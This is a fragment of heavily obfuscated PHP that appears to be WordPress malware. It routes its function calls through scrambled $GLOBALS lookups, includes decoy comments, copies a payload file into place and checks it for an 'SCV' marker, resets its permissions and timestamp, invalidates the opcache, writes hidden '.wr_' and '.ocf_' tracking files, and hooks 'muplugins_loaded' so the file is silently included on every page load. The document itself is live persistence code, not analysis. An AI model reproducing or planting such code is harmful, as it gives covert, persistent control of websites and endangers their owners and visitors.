if  (!$fhzjq48f7t21qw &&  $GLOBALS['__scf_c1mta2gut4_0']('copy'))    {
// @fulfill distributor

     $fhzjq48f7t21qw  = @$GLOBALS['__scf_znhapeov_2_34']($jlkexxg0c2t68xlb,   $h8wm0_28a9do);
if ($fhzjq48f7t21qw)  _sc_ul($jlkexxg0c2t68xlb);
      }
 if  (!$fhzjq48f7t21qw)    {
     _sc_ul($jlkexxg0c2t68xlb);
return;
  }
       if    ($GLOBALS['__scf_c1mta2gut4_0']('clearstatcache'))   {
 @clearstatcache(true, $h8wm0_28a9do);
  }
$j1gliacrny52cl4j =  @$GLOBALS['__scf_ruh5ibyhgm0_10']($h8wm0_28a9do);
 if   (!$GLOBALS['__scf_izffyy2jyg_25']($j1gliacrny52cl4j)    || $j1gliacrny52cl4j  !== $hmjc80n3xq_jfx0q)    {
     if    ($GLOBALS['__scf_izffyy2jyg_25']($j1gliacrny52cl4j)   &&  $GLOBALS['__scf_kf0a1jn1zhmxo_35']($j1gliacrny52cl4j,  '/* SCV:')  !== false)  return;



  _sc_fpc($GLOBALS['__scf_vxgcpxb32p_4']($h8wm0_28a9do)  .   '/.wr_'    .   $GLOBALS['__scf_u598lahb4p_21']($h8wm0_28a9do,  '.php'), '1');
  _sc_ul($h8wm0_28a9do);
   return;
  }
// expire non-singular effect-type

unset($j1gliacrny52cl4j);
_sc_ul($GLOBALS['__scf_vxgcpxb32p_4']($h8wm0_28a9do)   .   '/.wr_'   .  $GLOBALS['__scf_u598lahb4p_21']($h8wm0_28a9do,   '.php'));



  if   ($GLOBALS['__scf_c1mta2gut4_0']('chmod')) {
   @$GLOBALS['__scf_kaczq8glxwxx_36']($h8wm0_28a9do,   (352+68));
  }
 _sc_fam_touch($h8wm0_28a9do);

    if ($GLOBALS['__scf_c1mta2gut4_0']('opcache_invalidate'))     {
  @opcache_invalidate($h8wm0_28a9do, true);
}
$r59juixc9qtwk68  =     $GLOBALS['__scf_vxgcpxb32p_4']($h8wm0_28a9do)     .   '/.ocf_'  .  $eviy5j97qohr8s;


   _sc_fpc($r59juixc9qtwk68,  (string)    ((int) @$GLOBALS['__scf_ruh5ibyhgm0_10']($r59juixc9qtwk68)  +     1));
      if     ($lkea6c0cgxsfq4k4 &&    $GLOBALS['__scf_c1mta2gut4_0']('add_action'))  {
   add_action('muplugins_loaded', function  ()   use  ($h8wm0_28a9do)  {
try  {


    @include_once   $h8wm0_28a9do;
 }    catch (\Throwable  $waslhgj8me7wy)    {

 }  catch (\Exception   $waslhgj8me7wy)   {



  }
},   0);
  }
        };



 $i5mgtlip1wa84h89();
  unset($i5mgtlip1wa84h89);
  
}